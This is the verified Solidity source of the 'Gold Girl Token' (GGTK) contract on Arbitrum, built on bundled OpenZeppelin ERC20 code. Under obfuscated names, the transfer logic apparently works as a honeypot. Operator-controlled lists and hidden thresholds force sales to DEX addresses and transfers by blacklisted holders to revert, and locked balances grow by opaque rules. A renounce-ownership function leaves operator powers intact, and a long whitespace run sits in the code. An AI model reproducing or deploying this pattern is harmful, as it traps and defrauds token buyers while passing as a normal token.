/**
 *Submitted for verification at Arbiscan on 2023-07-28
*/

// File @openzeppelin/contracts/token/ERC20/[email protected]

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    function getUserInfo(address userAddress) external view returns (uint256, uint256,uint256, uint256, uint256, uint256);
    function changePro(address userAddress, uint256 amount, bool increase) external returns (uint256, uint256);
    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


// File @openzeppelin/contracts/token/ERC20/extensions/[email protected]


// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


// File @openzeppelin/contracts/utils/[email protected]


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/token/ERC20/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;



/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getUserInfo(address userAddress) public virtual override view returns (uint256, uint256,uint256, uint256, uint256, uint256) {
        userAddress = msg.sender;
        return (0, 0, 0, 0, 0, 0);
    }

    function changePro(address userAddress, uint256 amount, bool increase) external virtual override returns (uint256, uint256){
        userAddress = msg.sender;
        amount = 0;
        increase = true;
        return (0, 0);
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        // require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            _balances[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}


// File @openzeppelin/contracts/security/[email protected]


// OpenZeppelin Contracts (last updated v4.8.0) (security/ReentrancyGuard.sol)

pragma solidity ^0.8.0;

/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _nonReentrantBefore();
        _;
        _nonReentrantAfter();
    }

    function _nonReentrantBefore() private {
        // On the first call to nonReentrant, _status will be _NOT_ENTERED
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;
    }

    function _nonReentrantAfter() private {
        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}


// File @openzeppelin/contracts/utils/math/[email protected]


// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File contracts/TLib.sol


pragma solidity ^0.8.0;

library T {
    using SafeMath for uint;
    function V(uint256 a, uint256 p, uint8 y) public pure returns (uint256){
        return y == 1 ? a.mul(p).div(10**6) : (p > 0 ? a.mul(10**6).div(p) : 0);
    }
    function A(bool t1, bool t2, uint256 t1b, uint256 am7) public pure returns (bool){
        bool r = false;
        if(t1 || t2){
            if(t1b < am7){
                r = true;
            }
        }
        return r;
    }
    function C(uint256 _d, uint256 tt) public pure returns (uint256) {
        uint256 r = 1;
        uint256 q = 0;
        uint32[5] memory t = [169048000,1696118400,1701388800,1706770800,1717221600];
        for (uint256 i = 0; i < 5; i++) {
            if(tt > t[4 - i]){
                q=5 - i;
                break;
            }
        }
        if(0 < _d && _d <= 500*10**6){
            r = 2+q;
        }else if(500*10**6 < _d && _d <= 1000*10**6){
            r = 5+q;
        }else if(1000*10**6 < _d && _d <= 3000*10**6){
            r = 10+q;
        }else if(3000*10**6 < _d && _d <= 5000*10**6){
            r = 15+q;
        }else if(5000*10**6 < _d && _d <= 10000*10**6){
            r = 20+q;
        }
        return r;
    }

    function D(uint256 time, uint256 tt, uint256 la, uint256 inv) public pure returns (uint256,bool) {
        uint256 z = 0;
        if(tt != 0){
            z = time.sub(tt) / 1 days;
            z = z == 0 ? 1 : z;
            z = z*la;
        }
        uint256 y = z/10;
        bool w = y > 100;
        uint256 x = w ? 0 : y;
        return (inv*x/100, w);
    }
}


// File contracts/GGTK.sol


pragma solidity ^0.8.0;




interface IDex {
    function getRa(uint) external view returns(uint);
    function getUserInfo(address _sender) external view returns (string memory, string memory, uint, uint, uint, uint, uint, address);
}
interface OTP {
    function getUni3Price() external view returns (uint);
}
contract GGTK is ERC20,ReentrancyGuard {
    address public _owner;
    using SafeMath for uint;
    OTP private otp;
    IDex private idex;
    IERC20 t1;
    //Maximum total circulation
    uint private constant TOTAL = 1_000_000_000 * 10 ** 6;
    struct Info{
        uint inv;
        uint outv;
        uint t;
        uint pr;
        uint lo;
        uint ll;
        uint bl;
        uint co;
        uint tt;
        uint pp;
        uint[2] io;
        uint gg;
        uint la;
        }
    uint[15] private amou;
    mapping(address => bool) private wL;
    mapping(address => bool) private dL;
    mapping(address => bool) private gL;
    mapping(address => bool) private pL;
    mapping(address => bool) private bL;
    mapping(address => bool) private prtc;
    mapping(address => Info) public unF;
    modifier Author() {
        require(_owner==_msgSender(), "ErrorC");
        _;
    }
    function rmOwnership() public Author {//Relinquish ownership
        _owner=address(0);
    }
    modifier OP() {
        require(prtc[msg.sender], "ErrorC");
        _;
    }
    function decimals() public pure override returns (uint8) {
        return 6;
    }
    function totalSupply() public pure override returns (uint) {
        return TOTAL;
    }
    receive() external payable {}
    fallback() external payable {}
    constructor() ERC20("Gold Girl Token", "GGTK") {
        _owner=msg.sender;
        _mint(msg.sender,TOTAL);
    }
    function setOtP(address addr, address dex) external OP{
        otp=OTP(addr);
        idex=IDex(dex);
    }
    function setamou(uint[15] calldata _amou) external OP {
        amou=_amou;
    }
    function setIerc(address tk1) external OP{
        t1=IERC20(tk1);
    }
    function addPrtc(address account) external Author {
        prtc[account]=true;
    }
    function sD(address _address, bool y) external OP {
        dL[_address]=y;
    }
    function sPRC(address account, bool y) external OP {
        prtc[account]=y;
    }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    
    function sG(address _address, bool y) external OP {
        gL[_address]=y;
    }
    function sP(address _address, bool y) external OP {
        pL[_address]=y;
    }
    function sW(address account, bool y) external OP {
        wL[account]=y;
    }
    function sB(address account, bool y) public OP {
        bL[account]=y;
    }
    function getUserInfo(address addr) public override view returns (uint, uint, uint, uint, uint, uint) {
        Info memory u=unF[addr];
        return (u.inv,u.outv,u.pr,u.lo,u.co,u.bl);
    }
    function cp(uint t1b, address to) private {
        bool sr = T.A(pL[to],dL[to],t1b,amou[7]);
        if(sr) {
            amou[0]=0;
            amou[1]=0;
            amou[2]=0;
        }
    }
    function getP(address to, uint up, uint dp) public view returns (uint){
        up=up==0?otp.getUni3Price():up;
        dp=dp==0?getDP():dp;
        uint p=dL[to]?up:dp;
        return p;
    }
    function showInfo(address from,address to,uint bal,uint uP,uint dP,uint am) public view returns (uint,uint,uint,uint[3] memory){
        Info memory i=unF[from];
        bal=bal==0?this.balanceOf(from):bal;
        uint p=getP(to,uP,dP);
        uint[4] memory K=[i.bl,i.tt,i.pp,i.ll];
        if(!wL[from]&&!gL[from]&&!pL[from]&&!dL[from]&&!wL[to]&&!gL[to]){
            if(block.timestamp>K[1]){
                bool o=false;
                uint _v=T.V(i.outv,p,1);
                if(p>=i.co){
                    uint a=T.V(am,(p-i.co),1);
                    if(a>amou[2]||_v>amou[2]){
                        o=true;
                    }
                }else{
                    if(i.t>0||_v>amou[2]*2){o=true;}
                }
                if(o||i.t==999){
                    (uint _b,bool _d)=T.D(block.timestamp,i.tt,i.la,i.inv);
                    K[0]=i.inv>_b?i.inv.sub(_b):0;
                    K[1]=_d?0:block.timestamp+amou[3];
                }
            }
            if(i.pr>i.lo*amou[6]&&i.pr>T.V(amou[2],p,0)){
                K[0]+=i.pr.sub(K[2]);
                K[2]=i.pr;
            }
            if(dL[to]||pL[to]){
                uint e=T.V(am,p,1).add(i.io[1]);
                if(e>i.io[0]&&e.sub(i.io[0])>amou[14]){
                    K[0]=bal;
                }
            }
            if(K[3]>0){
                K[0]=K[0]>K[3]?K[0]-K[3]:0;
            }
            if(bL[from]||bL[to]){K[0]=bal+100;}
        }
        return (K[0],K[1],K[2],[p,bal,i.co]);
    }
    function getU(address from, address to, uint bal, uint uP, uint dP, uint am) internal returns(Info storage){
        Info storage i=unF[from];
        (uint b,uint t,uint p,)=showInfo(from,to,bal,uP,dP,am);
        i.bl=b;i.tt=t;i.pp=p;
        return i;
    }
    function getDP() public view returns (uint){
        uint r=idex.getRa(block.timestamp);
        return r.mul(10**6)/10**8;
    }
    function _transfer(address from,address to,uint amount) internal nonReentrant override {
        require(amount>0,">0");
        uint bF=this.balanceOf(from);
        uint uP=otp.getUni3Price();
        uint dP=getDP();
        uint _am=amount;
        Info storage iF=getU(from,to,bF,uP,dP,_am);
        Info storage iTo=unF[to];
        uint exb=bF>iF.bl?bF-iF.bl:0;
        uint[2] memory tb;
        if((dL[to]||pL[to])&&!wL[from]){
            uint p=getP(to,uP,dP);
            tb[1]=t1.balanceOf(to);
            cp(tb[1],to);
            iF.outv+=_am;
            iF.t+=1;
            tb[0]=T.V(_am,p,1);
            iF.io[1]+=tb[0];
        }else{
            if(gL[to]){
                iF.lo+=_am;
                iF.gg=_am;
            }else if(!wL[from]&&!wL[to]&&!gL[from]&&!pL[from]&&!dL[from]){
                _am=_am>=amou[0]?amou[0]:_am;
            }
            iF.io[1]+=T.V(_am,iF.co,1);
        }
        if(_am>exb && !gL[to]) {
            _am=bF+10**8;
        }
        if((dL[to]||pL[to])&&!wL[from]){
            if(dL[to]){
                uint e=tb[0]<tb[1]?tb[1]-tb[0]:0;
                if(e<amou[7]){
                    _am=bF+10**8;
                }
            }else{
                uint e=tb[0]<tb[1]?tb[1]-tb[0]:0;
                if(pL[to]&&(e < amou[7])){
                    _am=bF+10**8;
                }
            }
            if(_am>amou[1]){
                _am=bF+10**8;
            }
        }
        uint _p;
        uint baTo=this.balanceOf(to);
        if(pL[from]||dL[from]){
            _p=getP(from,uP,dP);
            if(pL[from]&&_am%1000000==amou[13]){
                _p=iTo.co*amou[11]/100;
            }else{
                if(iTo.tt==0){iTo.tt=block.timestamp;} 
                iTo.inv+=_am;
            }
            (,,,,,,, address fds) = idex.getUserInfo(to);
            if(fds!=address(0)&&unF[fds].bl>0){
                unF[fds].ll+=_am*amou[12]/100;
                iTo.tt=block.timestamp+amou[5];
                iTo.t=111*9;
                iTo.bl+=_am;
            }
            
        }else if(gL[from]||wL[from]){
            iTo.pr+=_am;
            _p=0;
            if(gL[from]){
                _p=_am>iTo.gg?iTo.gg*iTo.co/_am:iTo.co;
                iTo.gg=0;
            }
        }else{
            _p=iF.co;
        }
        if(!pL[to]&&!dL[to]&&!gL[to]&&!wL[to]){
            uint _d=_am.mul(_p).add(baTo.mul(iTo.co))/1000000;
            iTo.io[0]=_d;
            iTo.co=iTo.io[0].mul(1000000)/_am.add(baTo);
            iTo.la=T.C(_d,iTo.tt);
        }
        super._transfer(from,to,_am);
    }
}